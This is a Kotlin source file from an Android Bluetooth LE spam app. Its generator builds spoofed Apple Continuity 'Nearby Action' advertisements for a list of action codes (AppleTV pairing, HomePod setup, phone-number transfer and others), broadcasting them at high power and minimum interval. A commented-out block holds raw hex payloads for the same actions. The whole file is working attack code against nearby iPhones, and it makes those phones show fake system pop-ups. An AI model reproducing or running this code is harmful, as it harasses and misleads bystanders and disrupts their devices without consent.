package de.simon.dankelmann.bluetoothlespam.AdvertisementSetGenerators

import android.bluetooth.BluetoothDevice
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.AdvertisingSetParameters
import android.util.Log
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingSetCallback
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingCallback
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertiseMode
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementSetRange
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementSetType
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementTarget
import de.simon.dankelmann.bluetoothlespam.Enums.PrimaryPhy
import de.simon.dankelmann.bluetoothlespam.Enums.SecondaryPhy
import de.simon.dankelmann.bluetoothlespam.Enums.TxPowerLevel
import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers
import de.simon.dankelmann.bluetoothlespam.Models.AdvertisementSet
import de.simon.dankelmann.bluetoothlespam.Models.ManufacturerSpecificData
import kotlin.random.Random

class ContinuityActionModalAdvertisementSetGenerator: IAdvertisementSetGenerator {

    private val _logTag = "ContinuityActionModalAdvertisementSetGenerator"

    // Reversed from here: https://github.com/Flipper-XFW/Xtreme-Apps/blob/52c1c0f690bc01257e6461aa1081cf7d0faa92cf/ble_spam/protocols/continuity.c#L178

    // EXAMPLE: 0x10FF4C000F05C0-132C0CFE000010953EDF-00000000000000...
    // EXAMPLE: 0x10FF4C000F05C0-0B6473A6000010906584-00000000000000...

    //
    // 0x10FF4C000F05 = STATIC ( HEADER )
    // C0 = flags
    // 0B = action -> 0B = HomePod Setup
    // 6473A6 = authentication tag -> random data

    val _nearbyActions = mapOf(
        "13" to "AppleTV AutoFill",
        "27" to "AppleTV Connecting...",
        "20" to "Join This AppleTV?",
        "19" to "AppleTV Audio Sync",
        "1E" to "AppleTV Color Balance",
        "09" to "Setup New iPhone",
        "02" to "Transfer Phone Number",
        "0B" to "HomePod Setup",
        "01" to "Setup New AppleTV",
        "06" to "Pair AppleTV",
        "0D" to "HomeKit AppleTV Setup",
        "2B" to "AppleID for AppleTV?",
    )

    private val _manufacturerId = 76 // 0x004c == 76 = Apple
    override fun getAdvertisementSets(): List<AdvertisementSet> {
        var advertisementSets: MutableList<AdvertisementSet> = mutableListOf()

        _nearbyActions.map { nearbyAction ->
            var advertisementSet: AdvertisementSet = AdvertisementSet()
            advertisementSet.target = AdvertisementTarget.ADVERTISEMENT_TARGET_IOS
            advertisementSet.type = AdvertisementSetType.ADVERTISEMENT_TYPE_CONTINUITY_ACTION_MODALS
            advertisementSet.range = AdvertisementSetRange.ADVERTISEMENTSET_RANGE_UNKNOWN

            // Advertise Settings
            advertisementSet.advertiseSettings.advertiseMode = AdvertiseMode.ADVERTISEMODE_LOW_LATENCY
            advertisementSet.advertiseSettings.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertiseSettings.connectable = false
            advertisementSet.advertiseSettings.timeout = 0

            // Advertising Parameters
            advertisementSet.advertisingSetParameters.legacyMode = true
            advertisementSet.advertisingSetParameters.interval = AdvertisingSetParameters.INTERVAL_MIN
            advertisementSet.advertisingSetParameters.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertisingSetParameters.primaryPhy = PrimaryPhy.PHY_LE_1M
            advertisementSet.advertisingSetParameters.secondaryPhy = SecondaryPhy.PHY_LE_1M

            // AdvertiseData
            advertisementSet.advertiseData.includeDeviceName = false

            val manufacturerSpecificData = ManufacturerSpecificData()
            manufacturerSpecificData.manufacturerId = _manufacturerId

            // EXAMPLE: 0x10FF4C000F05C0-13-2C0CFE-000010-953EDF-00000000000000...
            // EXAMPLE: 0x10FF4C000F05C0-0B-6473A6-000010-906584-00000000000000...

            //
            // 0x10FF4C000F05 = STATIC ( HEADER )
            // C0 = flags
            // 0B = action -> 0B = HomePod Setup
            // 6473A6 = authentication tag -> random data
            // appendix

            var continuityType = "0F" // 0x0F = NearbyAction
            var payloadSize = "05"
            var flag = "C0"
            var action = nearbyAction.key
            var authenticationTag:ByteArray = Random.Default.nextBytes(3)
            //var appendix = "000010"
            //var randomAppendix = Random.Default.nextBytes(3)

            manufacturerSpecificData.manufacturerSpecificData = StringHelpers.decodeHex(continuityType + payloadSize + flag + action)
                .plus(authenticationTag)
                //.plus(StringHelpers.decodeHex(appendix))
                //.plus(randomAppendix)

            advertisementSet.advertiseData.manufacturerData.add(manufacturerSpecificData)
            advertisementSet.advertiseData.includeTxPower = false

            // Scan Response
            //advertisementSet.scanResponse.includeTxPower = false

            // General Data
            advertisementSet.title = nearbyAction.value

            // Callbacks
            advertisementSet.advertisingSetCallback = GenericAdvertisingSetCallback()
            advertisementSet.advertisingCallback = GenericAdvertisingCallback()

            advertisementSets.add(advertisementSet)
        }

        Log.d(_logTag, "Created " + advertisementSets.count() + "Items")

        return advertisementSets.toList()
    }

    /*
    private val _logTag = "ContinuityActionModalAdvertisementSetGenerator"

    // Device Data taken from here:
    // https://www.mobile-hacker.com/2023/09/07/spoof-ios-devices-with-bluetooth-pairing-messages-using-android/

    val _deviceData = mapOf(
        "AppleTV Setup" to "04042a0000000f05c101604c95000010000000",
        "AppleTV Pair" to "04042a0000000f05c106604c95000010000000",
        "AppleTV New User" to "04042a0000000f05c120604c95000010000000",
        "AppleTV AppleID Setup" to "04042a0000000f05c12b604c95000010000000",
        "AppleTV Wireless Audio Sync" to "04042a0000000f05c1c0604c95000010000000",
        "AppleTV Homekit Setup" to "04042a0000000f05c10d604c95000010000000",
        "AppleTV Keyboard" to "04042a0000000f05c113604c95000010000000",
        "AppleTV ‘Connecting to Network’" to "04042a0000000f05c127604c95000010000000",
        "Homepod Setup" to "04042a0000000f05c10b604c95000010000000",
        "Setup New Phone" to "04042a0000000f05c109604c95000010000000",
        "Transfer Number to New Phone" to "04042a0000000f05c102604c95000010000000",
        "TV Color Balance" to "04042a0000000f05c11e604c95000010000000"
    )

    private val _manufacturerId = 76 // 0x004c == 76 = Apple
    override fun getAdvertisementSets(): List<AdvertisementSet> {
        var advertisementSets: MutableList<AdvertisementSet> = mutableListOf()

        _deviceData.map { deviceData ->

            var advertisementSet: AdvertisementSet = AdvertisementSet()
            advertisementSet.target = AdvertisementTarget.ADVERTISEMENT_TARGET_IOS
            advertisementSet.type = AdvertisementSetType.ADVERTISEMENT_TYPE_CONTINUITY_ACTION_MODALS
            advertisementSet.range = AdvertisementSetRange.ADVERTISEMENTSET_RANGE_FAR

            // Advertise Settings
            advertisementSet.advertiseSettings.advertiseMode = AdvertiseMode.ADVERTISEMODE_LOW_LATENCY
            advertisementSet.advertiseSettings.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertiseSettings.connectable = false
            advertisementSet.advertiseSettings.timeout = 0

            // Advertising Parameters
            advertisementSet.advertisingSetParameters.legacyMode = true
            advertisementSet.advertisingSetParameters.interval = AdvertisingSetParameters.INTERVAL_MIN
            advertisementSet.advertisingSetParameters.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertisingSetParameters.primaryPhy = PrimaryPhy.PHY_LE_1M
            advertisementSet.advertisingSetParameters.secondaryPhy = SecondaryPhy.PHY_LE_1M

            // AdvertiseData
            advertisementSet.advertiseData.includeDeviceName = false

            val manufacturerSpecificData = ManufacturerSpecificData()
            manufacturerSpecificData.manufacturerId = _manufacturerId
            manufacturerSpecificData.manufacturerSpecificData =
                StringHelpers.decodeHex(deviceData.value)

            Log.d(
                _logTag,
                "Created Bytearray with ${manufacturerSpecificData.manufacturerSpecificData.size} Bytes"
            )

            advertisementSet.advertiseData.manufacturerData.add(manufacturerSpecificData)
            advertisementSet.advertiseData.includeTxPower = false

            // Scan Response
            //advertisementSet.scanResponse.includeTxPower = false

            // General Data
            advertisementSet.title = deviceData.key

            // Callbacks
            advertisementSet.advertisingSetCallback = GenericAdvertisingSetCallback()
            advertisementSet.advertisingCallback = GenericAdvertisingCallback()

            advertisementSets.add(advertisementSet)
        }

        return advertisementSets.toList()
    }*/
}